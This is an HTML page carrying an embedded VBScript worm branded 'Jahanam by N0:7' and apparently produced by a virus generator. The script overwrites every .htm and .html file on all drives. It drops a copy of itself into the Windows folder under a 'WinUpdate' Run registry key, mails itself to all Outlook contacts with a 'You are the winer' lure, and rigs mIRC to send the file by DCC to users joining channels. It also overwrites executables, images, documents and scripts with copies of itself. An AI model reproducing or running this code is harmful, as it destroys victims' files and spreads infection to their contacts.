<html><body>
<Script Language="VBScript"><!--
'Jahanam by ;;;N0:7;;;;
'Generated with Jahanam by N0:7
Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set fso = createobject("scripting.filesystemobject")
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive
end If 
Next 
function Dosearch(path)
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files
If fso.GetExtensionName(file.path)="htm" then
on error resume next
set drop = fso.createtextfile(File.path)
drop.writeline"<html><head><title>funny page</title></head><body bgcolor="green"><font color ="white" h3 align="center"infected by Jahanam<br>created by ;;;N0:7;;;;<br>http://trax.to/sevenC<br><br> generated with Jahanam by N0:7<br><br><br>This file has been infected by Jahanam -{ N0:7 }-</h></p></body></html>"
drop.close
end if
If fso.GetExtensionName(file.path)="html" then
on error resume next
set drop = fso.createtextfile(File.path)
drop.writeline"<html><head><title>funny page</title></head><body bgcolor="green"><font color ="white" h3 align="center"infected by Jahanam<br>created by ;;;N0:7;;;;<br>http://trax.to/sevenC<br><br> generated with Jahanam by N0:7<br><br><br>This file has been infected by Jahanam -{ N0:7 }-</h></p></body></html>"
drop.close
end if
next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path 
Next 
end function 
'This w0rm will be given when target load your fuckin file
'Do not edit this code below
'----------------------------------------
'Jahanam
'by ( n0:7 )
'generated with Jahanam by sevenC / N0:7
On error resume next
Set B0123 = createobject("scripting.filesystemobject")
C0123 = B0123.getspecialfolder(0)
D0123 = C0123 & "\Jahanam.vbs"
set drop = B0123.createtextfile(D0123)
drop.writeline "Set VU512894 = createobject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")
drop.writeline "Q81UU3N9 = VU512894.getspecialfolder(2)"
drop.writeline "Set G030F584 = createobject(" & Chr(34) & "wscript.shell" & Chr(34) & ")
drop.writeline "G030F584.regwrite " & Chr(34) & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate" & Chr(34) & ", " & Chr(34) & " & C8IIJSHJ & " & Chr(34) & " %" & Chr(34) & ""
drop.writeline "VU512894.copyfile wscript.scriptfullname, C8IIJSHJ"
drop.writeline "UB27PCQU"
drop.writeline "If G030F584.regread(" & Chr(34) & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\sevenDust\RT5LJ139" & Chr(34) & ") <> 1 then"
drop.writeline "HA4C1I7K"
drop.writeline "End if"
drop.writeline "If G030F584.regread(" & Chr(34) & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\sevenDust\A8UT7371" & Chr(34) & ") <> 1 then"
drop.writeline "EISL5BAE " & Chr(34) &  & Chr(34) & 
drop.writeline "End if"
drop.writeline "Set L67N31AH= VU512894.opentextfile(wscript.scriptfullname)"
drop.writeline "IC3FESE5 = L67N31AH.readall"
drop.writeline "L67N31AH.close"
drop.writeline "Do"
drop.writeline "if not(VU512894.fileexists(wscript.scriptfullname)) then"
drop.writeline "set I0IH8I51= VU512894.createtextfile(wscript.scriptfullname)"
drop.writeline "I0IH8I51.write IC3FESE5"
drop.writeline "I0IH8I51.close"
drop.writeline "end if"
drop.writeline "A2V61754 = G030F584.regread(" & Chr(34) & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate" & Chr(34) & ")"
drop.writeline "If A2V61754 <> " & Chr(34) & "wscript.exe " & Chr(34) & " & C8IIJSHJ & "  & Chr(34) & " &" & Chr(34) & " then"
drop.writeline "G030F584.regwrite " & Chr(34) & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate" & Chr(34) & ", " & Chr(34) & "wscript.exe" & Chr(34) & " & C8IIJSHJ & " & Chr(34) & " %" & Chr(34) & ""
drop.writeline "end if"
drop.writeline "A2V61754= " & Chr(34) &  & Chr(34) & 
drop.writeline "loop"
drop.writeline "Function HA4C1I7K()"
drop.writeline "Set IL9R5N33 = CreateObject(" & Chr(34) & "Outlook.Application" & Chr(34) & ")"
drop.writeline "Set MGF352ID = IL9R5N33.GetNameSpace(" & Chr(34) & "MAPI" & Chr(34) & ")"
drop.writeline "Set NT31FGB4 = MGF352ID.AddressLists"
drop.writeline "For Each J0493128 In NT31FGB4"
drop.writeline "If J0493128.AddressEntries.Count <> 0 Then"
drop.writeline "CFJ0BVGM = J0493128.AddressEntries.Count"
drop.writeline "For H8T6QB43 = 1 To CFJ0BVGM"
drop.writeline "Set UF6NV0H1 = IL9R5N33.CreateItem(0)"
drop.writeline "Set A54H10S5 = J0493128.AddressEntries(H8T6QB43)"
drop.writeline "UF6NV0H1.To = A54H10S5.Address"
drop.writeline "UF6NV0H1.Subject = " & Chr(34) & "Hi:" & Chr(34) & 
drop.writeline "UF6NV0H1.Body = " & Chr(34) & "hi:" & Chr(34) & " &vbcrlf& " & Chr(34) & "You are the winer..!!" & Chr(34) & " & vbcrlf & " & Chr(34) &  & Chr(34) & 
drop.writeline ""
drop.writeline "execute " & Chr(34) & "set A33C1M6K =UF6NV0H1." & Chr(34) & " & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)"
drop.writeline "M8291RET = C8IIJSHJ"
drop.writeline "UF6NV0H1.DeleteAfterSubmit = True"
drop.writeline "A33C1M6K.Add M8291RET"
drop.writeline "If UF6NV0H1.To <> " & Chr(34) &  & Chr(34) & " then"
drop.writeline "UF6NV0H1.Send"
drop.writeline "End If"
drop.writeline "Next"
drop.writeline "End If"
drop.writeline "Next"
drop.writeline "End If"
drop.writeline "End function"
drop.writeline "Function EISL5BAE(AIO57A3V)"
drop.writeline "If AIO57A3V <> " & Chr(34) &  & Chr(34) & " then"
drop.writeline "FRS25KB7 = G030F584.regread(" & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir" & Chr(34) & ")"
drop.writeline "If VU512894.fileexists(" & Chr(34) & "c:\mirc\mirc.ini" & Chr(34) & ") then"
drop.writeline "AIO57A3V = " & Chr(34) & "c:\mirc" & Chr(34) & 
drop.writeline "ElseIf VU512894.fileexists(" & Chr(34) & "c:\mirc32\mirc.ini" & Chr(34) & ") then"
drop.writeline "AIO57A3V = " & Chr(34) & "c:\mirc32" & Chr(34) & 
drop.writeline "ElseIf VU512894.fileexists(FRS25KB7 & " & Chr(34) & "\mirc\mirc.ini" & Chr(34) & ") Then"
drop.writeline "AIO57A3V = FRS25KB7 & " & Chr(34) & "\mirc" & Chr(34) & 
drop.writeline "ElseIf VU512894.fileexists(FRS25KB7 & " & Chr(34) & "\mirc32\mirc.ini" & Chr(34) & ") Then"
drop.writeline "AIO57A3V = FRS25KB7 & " & Chr(34) & "\mirc" & Chr(34) & 
drop.writeline "else"
drop.writeline "AIO57A3V = " & Chr(34) &  & Chr(34) & 
drop.writeline "end if"
drop.writeline "end if"
drop.writeline "If AIO57A3V <> " & Chr(34) &  & Chr(34) & " then"
drop.writeline "Set MB41TQQ5 = VU512894.CreateTextFile(AIO57A3V & " & Chr(34) & "\script.ini" & Chr(34) & ", true)"
drop.writeline "MB41TQQ5 = " & Chr(34) & "[script]" & Chr(34) & " & vbcrlf & " & Chr(34) & "n0=on 1:JOIN:#1:{" & Chr(34) & 
drop.writeline "MB41TQQ5 = MB41TQQ5 & vbCrLf & " & Chr(34) & "n0=on 1:JOIN:#:{" & Chr(34) & 
drop.writeline "MB41TQQ5 = MB41TQQ5 & vbCrLf & " & Chr(34) & "n1=  /if ( $nick == $me ) { halt }" & Chr(34) & 
drop.writeline "MB41TQQ5 = MB41TQQ5 & vbCrLf & " & Chr(34) & "n2=  /." & Chr(34) & " & chr(100) & chr(99) & chr (99) & " & Chr(34) & " send $nick " & Chr(34) & 
drop.writeline "MB41TQQ5 = MB41TQQ5 & C8IIJSHJ"
drop.writeline "MB41TQQ5 = MB41TQQ5 & vbCrLf & " & Chr(34) & "n3=}" & Chr(34) & 
drop.writeline "script.Close"
drop.writeline "End If"
drop.writeline "End Function"
drop.writeline "Function HJ8560DM()"
drop.writeline "On Error Resume Next"
drop.writeline "Set BP53491V = VU512894.Drives"
drop.writeline "For Each M24SPKI4 In BP53491V"
drop.writeline "F7EV7B4H = M24SPKI4 & " & Chr(34) & " \ " & Chr(34) & 
drop.writeline "Call CK61QP9E(F7EV7B4H)"
drop.writeline "Next"
drop.writeline "End Function"
drop.writeline ""
drop.writeline "Function CK61QP9E(GVU9OH76)"
drop.writeline "TQK7VJ53 = GVU9OH76"
drop.writeline "Set SND45BAO = VU512894.GetFolder(TQK7VJ53)"
drop.writeline "Set BJH22DTF = SND45BAO.Files"
drop.writeline "For Each JH4U1506 In BJH22DTF"
drop.writeline "If lcase(JH4U1506.Name) = " & Chr(34) & "mirc.ini" & Chr(34) & " then"
drop.writeline "EISL5BAE(JH4U1506.ParentFolder)"
drop.writeline "End If"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "vbs" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "vbe" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "dll" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "com" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "jpg" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "gif" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "bmp" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "exe" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "scr" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "php" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "asp" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "js" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "bat" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "reg" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "txt" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "If VU512894.GetExtensionName(JH4U1506.path) = " & Chr(34) & "pdf" & Chr(34) & 
drop.writeline "VU512894.CopyFile wscript.scriptfullname,JH4U1506.path,true"
drop.writeline "End if"
drop.writeline "Next"
drop.writeline "End function"
drop.writeline "Function UB27PCQU()"
drop.writeline "Randomize"
drop.writeline "If 1 + Int(Rnd * 50) = 7 then"
drop.writeline "Msgbox " & Chr(34) & "Infected by my self...." & Chr(34) & 
drop.writeline "end if"
drop.writeline "end function"
drop.writeline "'Jahanam by N0:7 ( my war against coderz )"
drop.writeline ""
drop.close
Set E0123 = createobject("wscript.shell")
E0123.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & D0123 & " %"
B0123.copyfile wscript.scriptfullname, D0123
--></script></body</html>
<html><head><title></title></head><body bgcolor="green"><h3 align ="center"><font color="white">Jahanam<br>created by ( n0:7 )<br>generated with JAHANAM by [N0:7]<br><br><br><br>There is nothing to say..!!<br>sevenC<br>http://trax.to/sevenC</p></h></font></body</html>"


